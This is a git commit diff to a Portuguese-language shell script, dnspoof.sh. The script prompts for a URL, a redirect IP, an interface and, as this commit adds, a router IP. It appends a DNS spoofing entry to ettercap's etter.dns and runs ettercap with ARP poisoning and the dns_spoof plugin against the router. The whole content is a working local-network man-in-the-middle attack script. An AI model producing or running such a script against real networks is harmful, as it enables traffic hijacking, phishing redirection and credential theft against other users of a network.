b38f8617c66e8c51873fe2965403335149a83a13
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2024-11-30 19:18:38 -0300

    Update dnspoof.sh

--- dnspoof.sh
+++ dnspoof.sh
@@ -5,6 +5,8 @@
 read -p "Digite a URL que deseja redirecionar: " url
 read -p "Digite o IP local para onde deseja redirecionar: " iplocal
 read -p "Digite a interface de rede (exemplo: eth0, wlan0): " iface
+read -p "Digite o IP do roteador (exemplo:192.168.0.1: " router
+
 
 # Verifica se o etter.conf existe e descomenta a linha que permite o redirecionamento
 if [ -f /etc/etter.conf ]; then
@@ -22,4 +24,4 @@ echo "$url A $iplocal" >> /usr/local/share/etter.dns
 echo "Redirecionamento DNS adicionado ao arquivo /usr/local/share/etter.dns"
 
 # Executa o ettercap com as opções fornecidas
-ettercap -T -Q -i "$iface" -M arp -P dns_spoof ////
+ettercap -T -Q -i "$iface" -M arp -P dns_spoof /"$router"//
